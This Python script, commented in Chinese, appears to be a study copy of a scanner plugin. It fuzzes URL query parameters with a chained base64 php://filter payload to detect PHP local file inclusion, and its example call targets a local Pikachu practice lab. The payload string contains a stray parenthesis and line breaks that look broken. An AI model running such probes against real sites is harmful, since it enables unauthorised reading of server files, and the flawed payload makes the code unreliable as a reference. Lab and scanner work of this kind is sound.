import requests
from urllib.parse import urlparse, parse_qs

def mirror_new_website_path_params(is_https, url, req, rsp, body):
    # 解析 URL 并获取查询参数
    # urlparse用于解析url，返回ParseResult对象，此对象包含了url的各种信息
    parsed_url = urlparse(url)
    # parsed_url.query获取url的查询参数,parse_qs将其转换为键值对的字典
    query_params = parse_qs(parsed_url.query)

    # 使用请求数据构建 HTTP 请求
    if is_https:
        req_url = f"https://{parsed_url.netloc}{parsed_url.path}"
    else:
        req_url = f"http://{parsed_url.netloc}{parsed_url.path}"

    # 模拟发送 HTTP 请求并获取响应
    response = requests.request("GET", req_url, params=query_params)
    benchmark_response = response.text

    # 遍历查询参数进行模糊测试
    for param, values in query_params.items():
        origin_value = values[0]
        p = "Vm0w"
        first_payload = (
                         f'''php://filter/convert.base64-encode/convert.base64-)
                            encode/convert.base64-encode/convert.base64-encode/convert.base64-
                            encode/convert.base64-encode/convert.base64-encode/convert.base64-
                            encode/convert.base64-encode/convert.base64-
                            encode//resource={origin_value}
        '''
        )
        # 进行模糊测试并获取响应
        fuzzed_response = requests.request("GET", req_url, params={param: first_payload})

        # 检查响应内容是否包含特定字符串
        if p in fuzzed_response.text:
            risk = {
                "url": url,
                "severity": "high",
                # 为什么响应体存在p即可证明有文件包含漏洞，为什么payload要用查询参数作为php伪协议读取的对象
                "titleVerbose": f"PHP伪协议文件包含文件: {url}",
                "title": f"PHP Protocol Filter Base64 ReadFile: {url}",
                "type": "file_include",
                "description": "文件包含漏洞",
                "request": fuzzed_response.request.body,
                "response": fuzzed_response.text,
                "payload": first_payload,
                "parameter": param,
                "solution": ""
            }
            print("Risk detected:", risk)
        else:
            print("未检测出漏洞")

# 示例调用
mirror_new_website_path_params(False, "http://192.168.58.130/pikachu-master/vul/fileinclude/fi_local.php?filename=file1.php&submit=%E6%8F%90%E4%BA%A4", None, None, None)
